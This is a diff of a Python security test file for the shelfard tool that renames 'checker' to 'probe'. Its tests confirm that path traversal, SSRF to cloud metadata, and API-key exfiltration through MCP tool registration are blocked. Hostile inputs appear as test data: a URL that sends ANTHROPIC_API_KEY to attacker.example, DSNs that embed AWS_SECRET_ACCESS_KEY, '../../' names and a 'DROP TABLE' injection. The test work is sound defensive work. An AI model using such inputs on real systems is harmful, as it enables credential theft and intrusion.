@@ -1,6 +1,6 @@
 """
 Security tests: path-traversal guards, MCP write-tool gating, env-var allowlist,
-SSRF protection, and checker/var tamper guards.
+SSRF protection, and probe/var tamper guards.
 
 Run: conda run -n shelfard python3 tests/security_tests.py
 """
@@ -20,7 +20,7 @@ sys.path.insert(0, str(Path(__file__).parent.parent))
 from shelfard import LocalFileRegistry
 from shelfard import registry
 from shelfard import mcp_server
-from shelfard.models import RestCheckerConfig, TableSchema, ColumnSchema, ColumnType
+from shelfard.models import RestProbeConfig, TableSchema, ColumnSchema, ColumnType
 from shelfard.security import check_url_safe, check_env_allowed, validate_name
 
 # ─────────────────────────────────────────────
@@ -101,12 +101,12 @@ def test_validate_name_accepts_good():
         assert validate_name(n) is None, f"{n!r} should be accepted"
 
 
-def test_register_checker_traversal_blocked():
+def test_register_probe_traversal_blocked():
     with tempfile.TemporaryDirectory() as tmp:
         root = Path(tmp) / "reg"
         r = LocalFileRegistry(root)
-        cfg = RestCheckerConfig(schema_name="../../pwned", url="https://example.com", headers=[], env=[])
-        res = r.register_checker("../../pwned", cfg)
+        cfg = RestProbeConfig(schema_name="../../pwned", url="https://example.com", headers=[], env=[])
+        res = r.register_probe("../../pwned", cfg)
         assert not res.success
         assert not (Path(tmp) / "pwned.json").exists()
         assert not any(Path(tmp).rglob("pwned.json"))
@@ -129,12 +129,12 @@ def test_subscribe_consumer_traversal_blocked():
         assert not (Path(tmp) / "evil").exists()
 
 
-def test_get_checker_traversal_blocked():
+def test_get_probe_traversal_blocked():
     with tempfile.TemporaryDirectory() as tmp:
         secret = Path(tmp) / "secret.json"
         secret.write_text('{"schema_name": "x", "url": "leak"}')
         r = LocalFileRegistry(Path(tmp) / "reg")
-        res = r.get_checker("../../secret")
+        res = r.get_probe("../../secret")
         assert not res.success and "leak" not in json.dumps(res.data or {})
 
 
@@ -153,19 +153,19 @@ def test_set_var_rejects_bad_name():
         assert r.set_var("good_name", "x").success
 
 
-def test_checker_schema_name_mismatch_rejected():
+def test_probe_schema_name_mismatch_rejected():
     with tempfile.TemporaryDirectory() as tmp:
         r = LocalFileRegistry(tmp)
-        cfg = RestCheckerConfig(schema_name="other", url="https://example.com", headers=[], env=[])
-        assert not r.register_checker("users", cfg).success
+        cfg = RestProbeConfig(schema_name="other", url="https://example.com", headers=[], env=[])
+        assert not r.register_probe("users", cfg).success
 
 
 for fn in [
     test_validate_name_rejects_bad, test_validate_name_accepts_good,
-    test_register_checker_traversal_blocked, test_register_schema_traversal_blocked,
-    test_subscribe_consumer_traversal_blocked, test_get_checker_traversal_blocked,
+    test_register_probe_traversal_blocked, test_register_schema_traversal_blocked,
+    test_subscribe_consumer_traversal_blocked, test_get_probe_traversal_blocked,
     test_get_schema_traversal_blocked, test_set_var_rejects_bad_name,
-    test_checker_schema_name_mismatch_rejected,
+    test_probe_schema_name_mismatch_rejected,
 ]:
     test(fn.__name__, fn)
 
@@ -232,25 +232,25 @@ def test_write_tools_hidden_by_default():
 
 def test_write_tools_exposed_with_flag():
     names = _tool_names(mcp_server.build_server(allow_writes=True))
-    assert {"register_checker", "register_postgres_checker", "set_template_var",
+    assert {"register_probe", "register_postgres_probe", "set_template_var",
             "delete_template_var"} <= names
 
 
 def test_mcp_register_blocks_secret_exfiltration():
     """The original attack: send ANTHROPIC_API_KEY to an attacker URL."""
     with _isolated_default_registry() as root, _fake_dns("93.184.216.34"):
-        out = json.loads(mcp_server.register_checker(
+        out = json.loads(mcp_server.register_probe(
             "x",
             "https://attacker.example/?k=$ANTHROPIC_API_KEY",
             env='["ANTHROPIC_API_KEY"]',
         ))
         assert not out["success"] and "ANTHROPIC_API_KEY" in out["error"]
-        assert not (root / "checkers" / "x.json").exists()
+        assert not (root / "probes" / "x.json").exists()
 
 
 def test_mcp_register_blocks_undeclared_env_ref():
     with _isolated_default_registry(), _fake_dns("93.184.216.34"):
-        out = json.loads(mcp_server.register_checker(
+        out = json.loads(mcp_server.register_probe(
             "x", "https://api.example/", headers='[{"Authorization": "$AWS_SECRET_ACCESS_KEY"}]',
         ))
         assert not out["success"] and "AWS_SECRET_ACCESS_KEY" in out["error"]
@@ -258,57 +258,57 @@ def test_mcp_register_blocks_undeclared_env_ref():
 
 def test_mcp_register_blocks_ssrf():
     with _isolated_default_registry(), _fake_dns("169.254.169.254"):
-        out = json.loads(mcp_server.register_checker("x", "http://metadata.example/latest"))
+        out = json.loads(mcp_server.register_probe("x", "http://metadata.example/latest"))
         assert not out["success"] and "internal" in out["error"]
 
 
 def test_mcp_register_blocks_traversal():
     with _isolated_default_registry(), _fake_dns("93.184.216.34"):
-        out = json.loads(mcp_server.register_checker("../../x", "https://api.example/"))
+        out = json.loads(mcp_server.register_probe("../../x", "https://api.example/"))
         assert not out["success"] and "Invalid" in out["error"]
 
 
 def test_mcp_register_rejects_malformed_json():
     with _isolated_default_registry():
-        out = json.loads(mcp_server.register_checker("x", "https://api.example/", env="nope"))
+        out = json.loads(mcp_server.register_probe("x", "https://api.example/", env="nope"))
         assert not out["success"]
-        out = json.loads(mcp_server.register_checker("x", "https://api.example/", headers='[1]'))
+        out = json.loads(mcp_server.register_probe("x", "https://api.example/", headers='[1]'))
         assert not out["success"]
 
 
-def test_mcp_register_allowed_checker():
+def test_mcp_register_allowed_probe():
     with _isolated_default_registry() as root, _fake_dns("93.184.216.34"):
-        out = json.loads(mcp_server.register_checker(
+        out = json.loads(mcp_server.register_probe(
             "users", "https://api.example/users",
             env='["SHELFARD_API_TOKEN"]',
             headers='[{"Authorization": "Bearer $SHELFARD_API_TOKEN"}]',
         ))
         assert out["success"], out
-        assert (root / "checkers" / "users.json").exists()
+        assert (root / "probes" / "users.json").exists()
 
 
 def test_mcp_register_cannot_overwrite():
     with _isolated_default_registry(), _fake_dns("93.184.216.34"):
-        registry.register_checker(
-            "users", RestCheckerConfig(schema_name="users", url="https://real.example/users", headers=[], env=[]),
+        registry.register_probe(
+            "users", RestProbeConfig(schema_name="users", url="https://real.example/users", headers=[], env=[]),
         )
-        out = json.loads(mcp_server.register_checker("users", "https://attacker.example/"))
+        out = json.loads(mcp_server.register_probe("users", "https://attacker.example/"))
         assert not out["success"] and "already exists" in out["error"]
-        assert registry.get_checker("users").data["checker"]["url"] == "https://real.example/users"
+        assert registry.get_probe("users").data["probe"]["url"] == "https://real.example/users"
 
 
-def test_mcp_cannot_redirect_checker_via_template_var():
+def test_mcp_cannot_redirect_probe_via_template_var():
     with _isolated_default_registry():
         registry.set_var("api_host", "https://real.example")
-        registry.register_checker(
+        registry.register_probe(
             "users",
-            RestCheckerConfig(
+            RestProbeConfig(
                 schema_name="users", url="{{api_host}}/users",
                 headers=[{"Authorization": "$TOKEN"}], env=["TOKEN"],
             ),
         )
         out = json.loads(mcp_server.set_template_var("api_host", "https://attacker.example"))
-        assert not out["success"] and "used by a registered checker" in out["error"]
+        assert not out["success"] and "used by a registered probe" in out["error"]
         out = json.loads(mcp_server.delete_template_var("api_host"))
         assert not out["success"]
         assert registry.get_var("api_host").data["value"] == "https://real.example"
@@ -320,8 +320,8 @@ for fn in [
     test_write_tools_hidden_by_default, test_write_tools_exposed_with_flag,
     test_mcp_register_blocks_secret_exfiltration, test_mcp_register_blocks_undeclared_env_ref,
     test_mcp_register_blocks_ssrf, test_mcp_register_blocks_traversal,
-    test_mcp_register_rejects_malformed_json, test_mcp_register_allowed_checker,
-    test_mcp_register_cannot_overwrite, test_mcp_cannot_redirect_checker_via_template_var,
+    test_mcp_register_rejects_malformed_json, test_mcp_register_allowed_probe,
+    test_mcp_register_cannot_overwrite, test_mcp_cannot_redirect_probe_via_template_var,
 ]:
     test(fn.__name__, fn)
 
@@ -338,9 +338,9 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import requests
 
 from shelfard import net
-from shelfard.models import PostgresCheckerConfig
-from shelfard.tools.rest import RestChecker
-from shelfard.tools.postgres import PostgresChecker
+from shelfard.models import PostgresProbeConfig
+from shelfard.tools.rest import RestProbe
+from shelfard.tools.postgres import PostgresProbe
 
 
 class _Server:
@@ -460,37 +460,37 @@ def _raises_exc(exc, fn):
     raise AssertionError(f"expected {exc.__name__}")
 
 
-def _rest_checker(via, url):
+def _rest_probe(via, url):
     with tempfile.TemporaryDirectory() as tmp:
         r = LocalFileRegistry(tmp)
         r.register_schema("users", _schema())
-        cfg = RestCheckerConfig(schema_name="users", url=url, headers=[], env=[], registered_via=via)
-        return RestChecker(cfg, r).run()
+        cfg = RestProbeConfig(schema_name="users", url=url, headers=[], env=[], registered_via=via)
+        return RestProbe(cfg, r).run()
 
 
-def test_mcp_rest_checker_guarded_at_run_time():
+def test_mcp_rest_probe_guarded_at_run_time():
     a = _Server({"/data": _OK})
     try:
-        res = _rest_checker("mcp", f"{a.url}/data")
+        res = _rest_probe("mcp", f"{a.url}/data")
         assert not res.success and "Blocked" in res.error, res.error
         assert a.seen == []
     finally:
         a.close()
 
 
-def test_cli_rest_checker_not_guarded():
+def test_cli_rest_probe_not_guarded():
     a = _Server({"/data": _OK})
     try:
-        assert _rest_checker("cli", f"{a.url}/data").success
+        assert _rest_probe("cli", f"{a.url}/data").success
     finally:
         a.close()
 
 
-def test_mcp_rest_checker_private_allowed_by_env():
+def test_mcp_rest_probe_private_allowed_by_env():
     a = _Server({"/data": _OK})
     try:
         with mock.patch.dict(os.environ, {"SHELFARD_MCP_ALLOW_PRIVATE_HOSTS": "1"}):
-            assert _rest_checker("mcp", f"{a.url}/data").success
+            assert _rest_probe("mcp", f"{a.url}/data").success
     finally:
         a.close()
 
@@ -499,8 +499,8 @@ for fn in [
     test_cross_origin_redirect_drops_headers, test_same_origin_redirect_keeps_headers,
     test_redirect_to_non_http_refused, test_too_many_redirects,
     test_guard_blocks_internal_peer_at_connect_time, test_guard_checks_every_redirect_hop,
-    test_mcp_rest_checker_guarded_at_run_time, test_cli_rest_checker_not_guarded,
-    test_mcp_rest_checker_private_allowed_by_env,
+    test_mcp_rest_probe_guarded_at_run_time, test_cli_rest_probe_not_guarded,
+    test_mcp_rest_probe_private_allowed_by_env,
 ]:
     test(fn.__name__, fn)
 
@@ -512,50 +512,50 @@ for fn in [
 section("PostgreSQL guards")
 
 
-def _run_pg_checker(cfg):
-    """Run a PostgresChecker with PostgresReader mocked; return (result, reader_mock)."""
+def _run_pg_probe(cfg):
+    """Run a PostgresProbe with PostgresReader mocked; return (result, reader_mock)."""
     reader = mock.MagicMock()
     reader.return_value.get_schema.return_value = mock.MagicMock(success=False, error="mocked")
     with tempfile.TemporaryDirectory() as tmp, \
             mock.patch("shelfard.tools.postgres.reader.PostgresReader", reader):
         r = LocalFileRegistry(tmp)
-        return PostgresChecker(cfg, r).run(), reader
+        return PostgresProbe(cfg, r).run(), reader
 
 
 def _pg_cfg(via, dsn="postgresql://u@db.example.com:5432/app", **kw):
-    return PostgresCheckerConfig(schema_name="pg", dsn=dsn, env=[], table="orders",
+    return PostgresProbeConfig(schema_name="pg", dsn=dsn, env=[], table="orders",
                                  registered_via=via, **kw)
 
 
-def test_mcp_pg_checker_pins_hostaddr():
+def test_mcp_pg_probe_pins_hostaddr():
     with _fake_dns("93.184.216.34"):
-        _, reader = _run_pg_checker(_pg_cfg("mcp"))
+        _, reader = _run_pg_probe(_pg_cfg("mcp"))
     dsn = reader.call_args[0][0]
     assert dsn.endswith("?hostaddr=93.184.216.34"), dsn
 
 
-def test_mcp_pg_checker_blocks_rebinding():
+def test_mcp_pg_probe_blocks_rebinding():
     with _fake_dns("10.0.0.7"):
-        res, reader = _run_pg_checker(_pg_cfg("mcp"))
+        res, reader = _run_pg_probe(_pg_cfg("mcp"))
     assert not res.success and "Blocked unsafe DSN" in res.error
     reader.assert_not_called()
 
 
-def test_mcp_pg_checker_blocks_unix_socket():
-    res, reader = _run_pg_checker(_pg_cfg("mcp", dsn="dbname=app"))
+def test_mcp_pg_probe_blocks_unix_socket():
+    res, reader = _run_pg_probe(_pg_cfg("mcp", dsn="dbname=app"))
     assert not res.success
     reader.assert_not_called()
 
 
-def test_cli_pg_checker_not_pinned():
-    _, reader = _run_pg_checker(_pg_cfg("cli", dsn="postgresql://u@localhost/app"))
+def test_cli_pg_probe_not_pinned():
+    _, reader = _run_pg_probe(_pg_cfg("cli", dsn="postgresql://u@localhost/app"))
     assert reader.call_args[0][0] == "postgresql://u@localhost/app"
 
 
-def test_pg_checker_rejects_query_template_at_run_time():
-    cfg = PostgresCheckerConfig(schema_name="pg", dsn="postgresql://u@localhost/app", env=[],
+def test_pg_probe_rejects_query_template_at_run_time():
+    cfg = PostgresProbeConfig(schema_name="pg", dsn="postgresql://u@localhost/app", env=[],
                                 query="SELECT * FROM t WHERE id = {{id}}")
-    res, reader = _run_pg_checker(cfg)
+    res, reader = _run_pg_probe(cfg)
     assert not res.success and "not allowed in SQL" in res.error
     reader.assert_not_called()
 
@@ -563,9 +563,9 @@ def test_pg_checker_rejects_query_template_at_run_time():
 def test_registry_rejects_query_template():
     with tempfile.TemporaryDirectory() as tmp:
         r = LocalFileRegistry(tmp)
-        cfg = PostgresCheckerConfig(schema_name="pg", dsn="postgresql://u@h/app", env=[],
+        cfg = PostgresProbeConfig(schema_name="pg", dsn="postgresql://u@h/app", env=[],
                                     query="SELECT {{cols}} FROM t")
-        res = r.register_checker("pg", cfg)
+        res = r.register_probe("pg", cfg)
         assert not res.success and "not allowed in SQL" in res.error
 
 
@@ -576,7 +576,7 @@ def test_cli_rejects_query_template():
          "--query", "SELECT * FROM {{t}}"],
         ["postgres", "check", "--dsn", "postgresql://u@h/db", "--name", "x",
          "--query", "SELECT * FROM {{t}}"],
-        ["checker", "register", "x", "--type", "postgres", "--dsn", "postgresql://u@h/db",
+        ["probe", "register", "x", "--type", "postgres", "--dsn", "postgresql://u@h/db",
          "--query", "SELECT * FROM {{t}}"],
     ):
         args = build_parser().parse_args(argv)
@@ -584,41 +584,41 @@ def test_cli_rejects_query_template():
 
 
 for fn in [
-    test_mcp_pg_checker_pins_hostaddr, test_mcp_pg_checker_blocks_rebinding,
-    test_mcp_pg_checker_blocks_unix_socket, test_cli_pg_checker_not_pinned,
-    test_pg_checker_rejects_query_template_at_run_time, test_registry_rejects_query_template,
+    test_mcp_pg_probe_pins_hostaddr, test_mcp_pg_probe_blocks_rebinding,
+    test_mcp_pg_probe_blocks_unix_socket, test_cli_pg_probe_not_pinned,
+    test_pg_probe_rejects_query_template_at_run_time, test_registry_rejects_query_template,
     test_cli_rejects_query_template,
 ]:
     test(fn.__name__, fn)
 
 
 # ─────────────────────────────────────────────
-# MCP register_postgres_checker (AGT-2)
+# MCP register_postgres_probe (AGT-2)
 # ─────────────────────────────────────────────
 
-section("MCP register_postgres_checker")
+section("MCP register_postgres_probe")
 
 _PG_DSN = "postgresql://reader:$SHELFARD_PG_PASSWORD@db.example.com:5432/app"
 
 
 def test_mcp_pg_register_ok():
     with _isolated_default_registry(), _fake_dns("93.184.216.34"):
-        out = json.loads(mcp_server.register_postgres_checker(
+        out = json.loads(mcp_server.register_postgres_probe(
             "orders", _PG_DSN, "orders", env='["SHELFARD_PG_PASSWORD"]'))
         assert out["success"], out
-        c = registry.get_checker("orders").data["checker"]
+        c = registry.get_probe("orders").data["probe"]
         assert c["registered_via"] == "mcp" and c["table"] == "orders" and c["query"] is None
 
 
 def test_mcp_rest_register_marks_mcp():
     with _isolated_default_registry(), _fake_dns("93.184.216.34"):
-        assert json.loads(mcp_server.register_checker("u", "https://api.example/u"))["success"]
-        assert registry.get_checker("u").data["checker"]["registered_via"] == "mcp"
+        assert json.loads(mcp_server.register_probe("u", "https://api.example/u"))["success"]
+        assert registry.get_probe("u").data["probe"]["registered_via"] == "mcp"
 
 
 def test_mcp_pg_register_blocks_private_host():
     with _isolated_default_registry(), _fake_dns("192.168.0.10"):
-        out = json.loads(mcp_server.register_postgres_checker(
+        out = json.loads(mcp_server.register_postgres_probe(
             "orders", _PG_DSN, "orders", env='["SHELFARD_PG_PASSWORD"]'))
         assert not out["success"] and "internal" in out["error"]
 
@@ -626,14 +626,14 @@ def test_mcp_pg_register_blocks_private_host():
 def test_mcp_pg_register_blocks_bad_identifiers():
     with _isolated_default_registry(), _fake_dns("93.184.216.34"):
         for table, schema in (("orders; DROP TABLE x", "public"), ("orders", "pub lic")):
-            out = json.loads(mcp_server.register_postgres_checker(
+            out = json.loads(mcp_server.register_postgres_probe(
                 "orders", _PG_DSN, table, db_schema=schema, env='["SHELFARD_PG_PASSWORD"]'))
             assert not out["success"], (table, schema)
 
 
 def test_mcp_pg_register_blocks_secret_env():
     with _isolated_default_registry(), _fake_dns("93.184.216.34"):
-        out = json.loads(mcp_server.register_postgres_checker(
+        out = json.loads(mcp_server.register_postgres_probe(
             "orders", "postgresql://u:$AWS_SECRET_ACCESS_KEY@db.example.com/app", "orders",
             env='["AWS_SECRET_ACCESS_KEY"]'))
         assert not out["success"] and "AWS_SECRET_ACCESS_KEY" in out["error"]
@@ -643,15 +643,15 @@ def test_mcp_pg_register_blocks_multihost_and_socket():
     with _isolated_default_registry(), _fake_dns("93.184.216.34"):
         for dsn in ("postgresql://u@a.example,b.example/app", "dbname=app",
                     "postgresql:///app?host=/var/run/postgresql"):
-            out = json.loads(mcp_server.register_postgres_checker("orders", dsn, "orders"))
+            out = json.loads(mcp_server.register_postgres_probe("orders", dsn, "orders"))
             assert not out["success"], dsn
 
 
 def test_mcp_pg_register_cannot_overwrite():
     with _isolated_default_registry(), _fake_dns("93.184.216.34"):
-        registry.register_checker("orders", PostgresCheckerConfig(
+        registry.register_probe("orders", PostgresProbeConfig(
             schema_name="orders", dsn="postgresql://u@real/app", env=[], table="orders"))
-        out = json.loads(mcp_server.register_postgres_checker(
+        out = json.loads(mcp_server.register_postgres_probe(
             "orders", "postgresql://u@db.example.com/app", "orders"))
         assert not out["success"] and "already exists" in out["error"]
 
